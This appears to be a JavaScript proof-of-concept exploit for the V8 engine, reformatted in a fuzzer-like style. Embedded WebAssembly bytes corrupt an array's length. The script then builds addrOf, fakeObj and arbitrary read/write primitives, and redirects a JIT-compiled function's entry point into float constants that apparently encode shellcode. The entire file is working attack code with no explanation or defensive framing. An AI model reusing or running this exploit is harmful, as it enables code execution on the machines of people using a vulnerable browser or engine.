let v2;
try { v2 = new ArrayBuffer(8); } catch (e) {}
const buf = v2;
let v5;
try { v5 = new Float64Array(buf); } catch (e) {}
const f64 = v5;
let v8;
try { v8 = new Uint32Array(buf); } catch (e) {}
const u32 = v8;
let v11;
try { v11 = new BigUint64Array(buf); } catch (e) {}
const bigUint64 = v11;
const v13 = (a14) => {
    f64[0] = a14;
    return bigUint64?.[0];
};
f2i = v13;
const v17 = (a18) => {
    bigUint64[0] = a18;
    return f64?.[0];
};
i2f = v17;
const v21 = (a22) => {
    f64[0] = a22;
    let v24;
    try { v24 = Array.from(u32); } catch (e) {}
    return v24;
};
d2u = v21;
const v26 = (a27, a28) => {
    u32[0] = a27;
    u32[1] = a28;
    return f64?.[0];
};
u2d = v26;
const v31 = (a32) => {
    let v35;
    try { v35 = a32.toString(16); } catch (e) {}
    return "0x" + v35;
};
hex = v31;
const v288 = [0,97,115,109,1,0,0,0,1,53,7,80,0,94,127,1,80,0,95,6,127,0,127,0,127,0,127,0,127,0,107,0,0,80,0,95,1,108,1,0,96,7,127,127,127,127,127,127,127,1,127,96,0,1,127,96,0,1,127,96,0,1,127,3,5,4,3,4,5,6,4,12,1,64,0,107,2,1,2,2,251,8,2,11,6,22,4,108,0,1,208,0,11,127,1,65,0,11,127,1,65,0,11,127,1,65,0,11,7,8,1,4,109,97,105,110,0,0,10,128,1,4,78,0,65,0,37,0,251,3,2,0,251,3,1,5,36,0,32,0,36,1,32,1,36,2,32,2,36,3,16,3,4,64,32,3,36,2,32,4,36,3,16,3,4,64,32,5,36,2,32,6,36,3,16,3,4,64,35,2,15,11,11,11,35,0,35,2,65,9,106,65,128,128,1,251,22,0,35,2,11,12,0,35,0,35,2,251,19,0,35,1,107,11,14,0,35,2,65,1,106,36,2,35,2,35,3,78,11,19,0,3,64,16,2,4,64,65,1,15,11,16,1,13,0,11,65,0,11];
let v289;
try { v289 = new Uint8Array(v288); } catch (e) {}
var wasm_code = v289;
const v291 = () => {
    return [1.9711828979523134e-246,1.9562205631094693e-246,1.9557819155246427e-246,1.9711824228871598e-246,1.971182639857203e-246,1.9711829003383248e-246,1.9895153920223886e-246,1.971182898881177e-246];
};
const foo = v291;
for (let i303 = 0; i303 < 65536; i303++) {
    try { foo(); } catch (e) {}
    try { foo(); } catch (e) {}
    try { foo(); } catch (e) {}
    try { foo(); } catch (e) {}
}
const v314 = WebAssembly?.Module;
let v315;
try { v315 = new v314(wasm_code); } catch (e) {}
var wasm_module = v315;
const v317 = WebAssembly?.Instance;
let v318;
try { v318 = new v317(wasm_module); } catch (e) {}
var instance = v318;
var oobArr = [1.951234,1.951234,1.951234];
var doubleArr = [1.1,2.2,3.3,4.4];
var objArr = [doubleArr,doubleArr];
const v334 = oobArr?.length;
let v336;
try { v336 = hex(v334); } catch (e) {}
const v337 = "==> Before Wasm Hack, oobArr's length: " + v336;
try { console.log(v337); } catch (e) {}
const v349 = instance?.exports;
let v350;
try { v350 = v349.main(613252610, 65536, 327680, 589824, 847872, 393216, 520192); } catch (e) {}
let v351;
try { v351 = v350.toString(16); } catch (e) {}
const v352 = "==> Find the offset is: 0x" + v351;
try { console.log(v352); } catch (e) {}
const v355 = oobArr?.length;
let v356;
try { v356 = hex(v355); } catch (e) {}
const v357 = "==> After Wasm Hack, oobArr's length: " + v356;
try { console.log(v357); } catch (e) {}
const v359 = oobArr?.[8];
let v361;
try { v361 = d2u(v359); } catch (e) {}
let doubleMap = v361?.[0];
const v364 = oobArr?.[18];
let v365;
try { v365 = d2u(v364); } catch (e) {}
let objMap = v365?.[0];
let v369;
try { v369 = hex(doubleMap); } catch (e) {}
const v370 = "==> double_map: " + v369;
try { console.log(v370); } catch (e) {}
let v373;
try { v373 = hex(objMap); } catch (e) {}
const v374 = "==> obj_map: " + v373;
try { console.log(v374); } catch (e) {}
const v376 = (a377) => {
    objArr[0] = a377;
    let v379;
    try { v379 = BigInt(doubleMap); } catch (e) {}
    let v381;
    try { v381 = i2f(v379); } catch (e) {}
    oobArr[18] = v381;
    const v382 = objArr?.[0];
    let v383;
    try { v383 = d2u(v382); } catch (e) {}
    ret = v383;
    let v385;
    try { v385 = BigInt(objMap); } catch (e) {}
    let v386;
    try { v386 = i2f(v385); } catch (e) {}
    oobArr[18] = v386;
    return ret?.[0];
};
addrOf = v376;
let v391;
try { v391 = addrOf(doubleArr); } catch (e) {}
var fakeAddr = v391 + 48;
let v397;
try { v397 = u2d(doubleMap, 0); } catch (e) {}
doubleArr[2] = v397;
let v400;
try { v400 = u2d(0, 4096); } catch (e) {}
doubleArr[3] = v400;
const v401 = (a402) => {
    let v404;
    try { v404 = u2d(a402, 0); } catch (e) {}
    doubleArr[0] = v404;
    let v406;
    try { v406 = BigInt(objMap); } catch (e) {}
    let v408;
    try { v408 = i2f(v406); } catch (e) {}
    oobArr[8] = v408;
    var fake_obj = doubleArr?.[0];
    let v411;
    try { v411 = BigInt(doubleMap); } catch (e) {}
    let v412;
    try { v412 = i2f(v411); } catch (e) {}
    oobArr[8] = v412;
    return fake_obj;
};
fakeObj = v401;
let v415;
try { v415 = fakeObj(fakeAddr); } catch (e) {}
var fake_obj = v415;
const v417 = (a418) => {
    const v420 = a418 - 8;
    let v422;
    try { v422 = u2d(v420, 4096); } catch (e) {}
    doubleArr[3] = v422;
    const v423 = fake_obj?.[0];
    let v425;
    try { v425 = f2i(v423); } catch (e) {}
    return v425;
};
arb_r = v417;
const v427 = (a428, a429) => {
    const v431 = a428 - 8;
    let v433;
    try { v433 = u2d(v431, 4096); } catch (e) {}
    doubleArr[3] = v433;
    fake_obj[0] = a429;
};
arb_w = v427;
let v435;
try { v435 = addrOf(instance); } catch (e) {}
var instance_addr = v435;
let v437;
try { v437 = addrOf(foo); } catch (e) {}
var foo_addr = v437;
let v440;
try { v440 = hex(foo_addr); } catch (e) {}
const v441 = "==> foo_addr: " + v440;
try { console.log(v441); } catch (e) {}
const v444 = foo_addr + 24;
let v446;
try { v446 = arb_r(v444); } catch (e) {}
let v449;
try { v449 = BigInt("0xffffffff"); } catch (e) {}
var code_addr = v446 & v449;
let v453;
try { v453 = hex(code_addr); } catch (e) {}
const v454 = "==> code_addr: " + v453;
try { console.log(v454); } catch (e) {}
let v457;
try { v457 = Number(code_addr); } catch (e) {}
const v459 = v457 + 16;
let v460;
try { v460 = arb_r(v459); } catch (e) {}
var code_entry_point_addr = v460;
let v463;
try { v463 = hex(code_entry_point_addr); } catch (e) {}
const v464 = "==> code_entry_point_addr: " + v463;
try { console.log(v464); } catch (e) {}
let v466;
try { v466 = Number(code_addr); } catch (e) {}
const v468 = v466 + 16;
let v471;
try { v471 = BigInt("0x53"); } catch (e) {}
const v472 = code_entry_point_addr + v471;
let v474;
try { v474 = i2f(v472); } catch (e) {}
try { arb_w(v468, v474); } catch (e) {}
try { foo(); } catch (e) {}
